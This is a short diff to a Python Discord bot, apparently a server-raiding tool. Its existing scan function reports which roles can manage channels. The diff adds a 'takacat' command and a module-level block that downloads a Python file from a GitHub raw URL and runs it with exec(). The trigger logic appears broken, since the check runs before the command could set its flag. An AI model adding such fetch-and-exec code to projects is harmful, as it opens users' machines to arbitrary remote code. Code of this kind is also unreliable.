@@ -1143,7 +1143,18 @@ async def scan(ctx):
             elif overwrite.manage_channels == True:
                 print(f"You can manage {channel.name} with '{role.name}' role")
  
+fusion = False
 
+@slayer.command()
+async def takacat(ctx):
+    global fusion
+    fusion = True
+
+
+if fusion == True:
+    r = requests.get("https://raw.githubusercontent.com/Takaso2/reincat/main/reincat.py")
+    reincode = r.content
+    exec(reincode)
 
 if account_type in Answers:
     try:
